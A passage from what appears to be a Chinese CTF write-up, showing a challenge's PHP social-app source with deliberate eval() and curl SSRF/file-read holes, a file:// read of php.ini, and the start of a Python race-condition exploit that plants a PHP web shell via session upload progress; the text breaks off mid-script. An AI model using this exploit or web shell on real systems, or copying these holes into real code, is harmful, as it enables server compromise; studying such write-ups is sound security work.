class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;Post.php&#x27;</span>;<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;Message.php&#x27;</span>;<br><br><span class="hljs-variable">$db</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Database</span>();<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-variable">$db</span>);<br><span class="hljs-variable">$post</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Post</span>(<span class="hljs-variable">$db</span>);<br><span class="hljs-variable">$message</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(<span class="hljs-variable">$db</span>);<br><br><span class="hljs-variable">$error</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$success</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;action&#x27;</span>]) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;register&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">register</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;Registration successful. Please log in.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;Registration failed. Please try again.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;login&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;Login successful.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;Invalid username or password.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;create_post&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>                    <span class="hljs-variable">$imageUrl</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;image_url&#x27;</span>]) ? <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;image_url&#x27;</span>] : <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$post</span>-&gt;<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>], <span class="hljs-variable">$imageUrl</span>)) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;Post created successfully.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;Failed to create post.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;send_message&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;to_user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$message</span>-&gt;<span class="hljs-title function_ invoke__">send</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;to_user_id&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;Message sent successfully.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;Failed to send message.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;download_message&#x27;</span>:<br>                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">test</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>])) &#123;<br>                        <span class="hljs-variable">$success</span> = <span class="hljs-string">&quot;successfully.&quot;</span>;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$error</span> = <span class="hljs-string">&quot;fail.&quot;</span>;<br>                    &#125;<br>                &#125;<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$feed</span> = <span class="hljs-variable">$post</span>-&gt;<span class="hljs-title function_ invoke__">getFeed</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>这是<code>Database.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Database</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$conn</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;conn = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">mysqli</span>(DB_HOST, DB_USER, DB_PASS, DB_NAME);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;conn-&gt;connect_error) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Connection failed: &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;connect_error);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">query</span>(<span class="hljs-params"><span class="hljs-variable">$sql</span>, <span class="hljs-variable">$params</span> = []</span>) </span>&#123;<br><br>        <span class="hljs-variable">$stmt</span> = <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$sql</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$stmt</span> === <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$params</span>)) &#123;<br>            <span class="hljs-variable">$types</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$params</span>));<br>            <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">bind_param</span>(<span class="hljs-variable">$types</span>, ...<span class="hljs-variable">$params</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$sql</span>, <span class="hljs-string">&#x27;select&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">get_result</span>();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$stmt</span>-&gt;affected_rows;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escape</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;conn-&gt;<span class="hljs-title function_ invoke__">real_escape_string</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>这是<code>User.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$db</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">register</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$email</span></span>) </span>&#123;<br>        <span class="hljs-variable">$hashedPassword</span> = <span class="hljs-title function_ invoke__">password_hash</span>(<span class="hljs-variable">$password</span>, PASSWORD_DEFAULT);<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO users (username, password, email) VALUES (?, ?, ?)&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$username</span>, <span class="hljs-variable">$hashedPassword</span>, <span class="hljs-variable">$email</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>) </span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$username</span>]);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>-&gt;num_rows == <span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$user</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">password_verify</span>(<span class="hljs-variable">$password</span>, <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>] = <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>                <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$user</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>,<span class="hljs-variable">$data</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">array_unique</span>(<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$data</span>))) &lt;= <span class="hljs-number">7</span> &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>, <span class="hljs-variable">$data</span>))&#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p><code>post.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Post</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$db</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"><span class="hljs-variable">$userId</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$imageUrl</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO posts (user_id, content, image_url) VALUES (?, ?, ?)&quot;</span>;<br>        <span class="hljs-variable">$image</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">uploadImage</span>(<span class="hljs-variable">$userId</span>,<span class="hljs-variable">$imageUrl</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$userId</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$image</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFeed</span>(<span class="hljs-params"><span class="hljs-variable">$page</span> = <span class="hljs-number">1</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-number">10</span></span>) </span>&#123;<br>        <span class="hljs-variable">$offset</span> = (<span class="hljs-variable">$page</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$limit</span>;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT p.*, u.username FROM posts p JOIN users u ON p.user_id = u.id ORDER BY p.created_at DESC LIMIT ?, ?&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$offset</span>, <span class="hljs-variable">$limit</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">uploadImage</span>(<span class="hljs-params"><span class="hljs-variable">$userId</span>, <span class="hljs-variable">$imageUrl</span></span>) </span>&#123;<br>        <br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span> (<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$imageUrl</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);<br>        <span class="hljs-variable">$imageContent</span> = <span class="hljs-title function_ invoke__">curl_exec</span> (<span class="hljs-variable">$curl</span>);<br>        <span class="hljs-title function_ invoke__">curl_close</span> (<span class="hljs-variable">$curl</span>);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|gopher|dict/i&#x27;</span>,<span class="hljs-variable">$imageUrl</span>) &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/php|&lt;\?|script/i&#x27;</span>,<span class="hljs-variable">$imageContent</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$imageContent</span> !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$imageContent</span>)&gt;<span class="hljs-number">50</span>) &#123;<br>            <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;profile_&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$imageUrl</span>) . <span class="hljs-string">&#x27;.jpg&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;./uploads/&#x27;</span> . <span class="hljs-variable">$filename</span>, <span class="hljs-variable">$imageContent</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;./uploads/&quot;</span> . <span class="hljs-variable">$filename</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
<p><code>Message.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Message</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$db</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$db</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;db = <span class="hljs-variable">$db</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">send</span>(<span class="hljs-params"><span class="hljs-variable">$fromUserId</span>, <span class="hljs-variable">$toUserId</span>, <span class="hljs-variable">$content</span></span>) </span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;INSERT INTO messages (from_user_id, to_user_id, content) VALUES (?, ?, ?)&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$fromUserId</span>, <span class="hljs-variable">$toUserId</span>, <span class="hljs-variable">$content</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getConversation</span>(<span class="hljs-params"><span class="hljs-variable">$user1Id</span>, <span class="hljs-variable">$user2Id</span>, <span class="hljs-variable">$page</span> = <span class="hljs-number">1</span>, <span class="hljs-variable">$limit</span> = <span class="hljs-number">20</span></span>) </span>&#123;<br>        <span class="hljs-variable">$offset</span> = (<span class="hljs-variable">$page</span> - <span class="hljs-number">1</span>) * <span class="hljs-variable">$limit</span>;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM messages WHERE (from_user_id = ? AND to_user_id = ?) OR (from_user_id = ? AND to_user_id = ?) ORDER BY created_at DESC LIMIT ?, ?&quot;</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>, [<span class="hljs-variable">$user1Id</span>, <span class="hljs-variable">$user2Id</span>, <span class="hljs-variable">$user2Id</span>, <span class="hljs-variable">$user1Id</span>, <span class="hljs-variable">$offset</span>, <span class="hljs-variable">$limit</span>]);<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>打包分析一下发现存储在一个文件夹跟进，发现有漏洞的地方是在post.php里，但是已经利用过了</p>
<p>在index.php里有</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"><span class="hljs-variable">$id</span>,<span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">array_unique</span>(<span class="hljs-title function_ invoke__">str_split</span>(<span class="hljs-variable">$data</span>))) &lt;= <span class="hljs-number">7</span> &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>, <span class="hljs-variable">$data</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>可以打一个条件竞争进去</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">file:///etc/php/7.0/apache2/php.ini<br></code></pre></td></tr></table></figure>
<p><img src="/../../images/ylctf/2024/fox.png" srcset="/img/loading.gif" lazyload alt="fox"></p>
<p>然后上exp吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><br>sessid = <span class="hljs-string">&#x27;orange&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">WRITE</span>(<span class="hljs-params">session</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        f = io.BytesIO(<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">50</span>)<br>        session.post(<br>            <span class="hljs-string">&#x27;http://challenge.yuanloo.com:27814/index.php&#x27;</span>,<br>            data=&#123;<br>                <span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;1\necho &#x27;&lt;?php eval($_POST[a]);&#x27;&gt;/var/www/html/uploads/shell.php\n&quot;</span>&#125;,<br>            files=&#123;<span class="hljs-string">&quot;file&quot;</span>: (<span class="hljs-string">&#x27;wi.txt&#x27;</span>, f)&#125;,<br>            cookies=&#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;<br>        )<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">READ</span>(<span 